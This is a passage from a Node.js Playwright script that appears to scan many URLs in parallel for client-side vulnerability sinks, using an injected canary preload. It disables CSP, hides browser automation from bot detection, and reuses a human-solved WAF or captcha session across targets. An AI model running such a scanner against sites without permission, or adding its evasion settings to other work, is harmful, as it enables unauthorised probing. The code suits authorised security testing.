        const count = domain_record_error(url_domain);
        eprint(`[${url_domain} err ${count}/${DOMAIN_MAX_ERRORS}] ${r}`);
    } finally {
        try { await page.close(); } catch { /* ignore */ }
    }
}

// ---------------------------------------------------------------------------
// concurrency
// ---------------------------------------------------------------------------

async function newContext(browser) {
    const context = await browser.newContext({
        bypassCSP: true,
        userAgent: config.ua,
        ignoreHTTPSErrors: true,
        ...(Object.keys(extra_headers).length ? { extraHTTPHeaders: extra_headers } : {}),
        ...(storage_state_path ? { storageState: storage_state_path } : {}),
        ...(viewport ? { viewport } : {}),
    });
    await context.addInitScript({ content: preloadjs });
    return context;
}

function isClosedError(e) {
    const msg = String((e && e.message) || e);
    return msg.includes('has been closed')     // "Target page, context or browser has been closed"
        || msg.includes('Target closed')
        || msg.includes('Target crashed')       // renderer OOM / hard crash
        || msg.includes('Browser closed')
        || msg.includes('Connection closed');
}

function isTimeoutError(e) {
    return String((e && e.message) || e).includes('hang timeout');
}

// Race a promise against a deadline. Playwright's page.evaluate() (and newPage/
// close) have no internal timeout, so a wedged renderer would otherwise hang a
// worker forever. The losing promise is left with a no-op catch so its eventual
// rejection (e.g. once we recycle the context) isn't an unhandled rejection.
function withTimeout(promise, ms, label) {
    let timer;
    promise.catch(() => { /* swallowed if it loses the race */ });
    const deadline = new Promise((_, reject) => {
        timer = setTimeout(() => reject(new Error(`hang timeout ${ms}ms: ${label}`)), ms);
    });
    return Promise.race([promise, deadline]).finally(() => clearTimeout(timer));
}

async function closeQuietly(...items) {
    for (const it of items) {
        // Bound the close: a wedged browser can make close() hang too.
        try { if (it) await withTimeout(it.close(), CLOSE_TIMEOUT, 'close'); } catch { /* ignore */ }
    }
}

function launchBrowser() {
    return chromium.launch({
        headless: !headed,
        args: ['--disable-blink-features=AutomationControlled'],
    });
}

async function worker(queue) {
    // Each worker owns its browser so one crash can't take down the others, and
    // recycles it every BROWSER_REFRESH_INTERVAL URLs to cap memory growth.
    let browser = await launchBrowser();
    let context = await newContext(browser);
    let processed = 0;
    const recycle = async () => {
        await closeQuietly(context, browser);
        browser = await launchBrowser();
        context = await newContext(browser);
        processed = 0;
    };
    try {
        while (true) {
            const url = queue.shift();
            if (url === undefined) break;
            if (processed >= BROWSER_REFRESH_INTERVAL) await recycle();
            try {
                // Hard per-URL deadline: process_url handles its own routine
                // errors, so anything reaching here is a crashed browser or a
                // hang (renderer stuck in JS). Either way the context is suspect
                // — recycle to a fresh browser before the next URL.
                await withTimeout(process_url(context, url), URL_HANG_TIMEOUT, `process_url ${netloc(url)}`);
                processed++;
            } catch (e) {
                const why = isTimeoutError(e) ? 'hung' : 'browser closed';
                eprint(`[worker] ${why} on ${netloc(url)}, relaunching: ${e}`);
                await recycle();
            }
        }
    } finally {
        await closeQuietly(context, browser);
    }
}

// ---------------------------------------------------------------------------
// session capture
// ---------------------------------------------------------------------------

async function capture_session(url, savePath, ua, vp) {
    // Open a visible browser at `url`, let the human pass any WAF/captcha, then
    // save cookies + localStorage to `savePath` for reuse with --session.
    const browser = await chromium.launch({
        headless: false,
        args: ['--disable-blink-features=AutomationControlled'],
    });
    const context = await browser.newContext({
        userAgent: ua,
        ignoreHTTPSErrors: true,
        ...(vp ? { viewport: vp } : {}),
    });
    const page = await context.newPage();
    try {
        await page.goto(url, { timeout: 30000, waitUntil: 'commit' });
    } catch (e) {
        eprint(`[capture] goto: ${e}`);
    }
    eprint('\n[capture] A browser window is open. Solve any captcha / wait for the\n'
        + '          real page to load, then press Enter here to save the session.');
    await new Promise((resolve) => {
        if (!process.stdin.isTTY) { setTimeout(resolve, 15000); return; }
        const rl = readline.createInterface({ input: process.stdin });
        rl.question('', () => { rl.close(); resolve(); });
    });
    await context.storageState({ path: savePath });
    const cookies = await context.cookies();
    eprint(`[capture] saved session (${cookies.length} cookies) to ${savePath}`);
    try { await browser.close(); } catch { /* ignore */ }
}

// ---------------------------------------------------------------------------
// templating
// ---------------------------------------------------------------------------

function getInjectJS() {
    return fs.readFileSync(path.join(ROOT, 'js', 'preload_inject.js'), 'utf8');
}

function getPreloadJS() {
    const preloadPath = config.preload_script;
    let content = fs.readFileSync(path.join(ROOT, preloadPath), 'utf8');
    content = content.split('{{canary}}').join(config.canary);
    content = content.replace('"{{topparams}}"', JSON.stringify(config.topparams));
    return content;
}

async function readLines(stream) {
    const lines = [];
    const rl = readline.createInterface({ input: stream, crlfDelay: Infinity });
    for await (const line of rl) {
        const t = line.trim();
        if (t) lines.push(t);
    }
    return lines;
}

// ---------------------------------------------------------------------------
// main
// ---------------------------------------------------------------------------

async function main() {
    preloadjs = getPreloadJS();
    injectjs = getInjectJS();
    fs.writeFileSync(path.join(ROOT, 'js', 'preload_debug.js'), preloadjs);

    let parsed;
    try {
        parsed = parseArgs({
            options: {
                urls: { type: 'string', short: 'u' },
                threads: { type: 'string', short: 't' },
                wait: { type: 'string', short: 'w' },
                output: { type: 'string', short: 'o' },
                debug: { type: 'boolean', short: 'd' },
                dedup: { type: 'boolean', short: 'D' },
                header: { type: 'string', short: 'H', multiple: true },
                ua: { type: 'string' },
                session: { type: 'string' },
                'capture-session': { type: 'string' },
                headed: { type: 'boolean' },
                viewport: { type: 'string' },
                help: { type: 'boolean', short: 'h' },
            },
            allowPositionals: false,
        });
    } catch (e) {
        eprint(`argument error: ${e.message}`);
        process.exit(2);
    }
    const args = parsed.values;

    if (args.help) {
        printHelp();
        return;
    }

    const threads = args.threads ? parseInt(args.threads, 10) : 10;
    stage1_wait = args.wait ? parseFloat(args.wait) : 0;
    debug_mode = !!args.debug;
    dedup = !!args.dedup;
    headed = !!args.headed;

    if (args.viewport) {
        const m = args.viewport.toLowerCase().split('x');
        const w = parseInt(m[0], 10);
        const h = parseInt(m[1], 10);
        if (!Number.isFinite(w) || !Number.isFinite(h) || m.length !== 2) {
            eprint(`--viewport expects WxH (e.g. 430x932), got: ${args.viewport}`);
            process.exit(2);
        }
        viewport = { width: w, height: h };
    }
    if (args.ua) config.ua = args.ua;

    if (args['capture-session']) {
        if (!args.session) {
            eprint('--capture-session requires --session PATH to save the session to');
            process.exit(2);
        }
        await capture_session(args['capture-session'], args.session, config.ua, viewport);
        return;
    }
    if (args.session) {
        storage_state_path = args.session;
        eprint(`[session] reusing ${storage_state_path} (cookies kept across URLs)`);
    }
    for (const hdr of (args.header || [])) {
        const idx = hdr.indexOf(':');
        if (idx === -1) {
            eprint(`[header] ignoring malformed (expected 'Name: Value'): ${hdr}`);
            continue;
        }
        extra_headers[hdr.slice(0, idx).trim()] = hdr.slice(idx + 1).trim();
    }
    if (args.output) {
        outputStream = fs.createWriteStream(args.output, { flags: 'w' });
    }

    // Read all URLs up front (from file or stdin), then process with a pool.
    let urls;
    if (args.urls) {
        urls = (await readLines(fs.createReadStream(args.urls))).slice();
    } else {
        // No -u and stdin is an interactive terminal (not piped/redirected):
        // reading it would block forever waiting for the user. Show usage and
        // exit instead of hanging.
        if (process.stdin.isTTY) {
            eprint('no input: pass -u FILE or pipe URLs on stdin (see --help)');
            process.exit(2);
        }
        urls = await readLines(process.stdin);
    }

    if (!urls.length) {
        eprint('no URLs to process');
        return;
    }

    const queue = urls;  // workers .shift() from this shared array
    const n = Math.max(1, Math.min(threads, urls.length));
    const workers = [];
    for (let i = 0; i < n; i++) workers.push(worker(queue));  // each worker owns/recycles its browser
    await Promise.all(workers);

    if (outputStream) outputStream.end();
}

function printHelp() {
    process.stdout.write(`Usage: node mthook.js [options]

  -u, --urls FILE        File containing URLs to process (else read stdin)
  -t, --threads N        Concurrent workers (default 10)
  -w, --wait SECONDS     Seconds to wait (networkidle) after stage-1 load
  -o, --output FILE      File to write confirmed findings to (truncated)
  -d, --debug            Print unconfirmed sinks and reflected hits to stderr
  -D, --dedup            Enable per-domain sink/reflected deduplication
  -H, --header "N: V"    Extra HTTP header sent on every request (repeatable)
      --ua UA            Override the User-Agent from config.yaml
      --session PATH     Load storageState JSON and keep cookies across URLs
      --capture-session URL  Headed capture: solve WAF/captcha, save --session
      --headed           Run browsers visibly (needs a display)
      --viewport WxH     Fixed viewport size, e.g. 430x932 (default 1280x720)
`);
}

main().catch((e) => {
    eprint(`fatal: ${e && e.stack ? e.stack : e}`);
    process.exit(1);
});
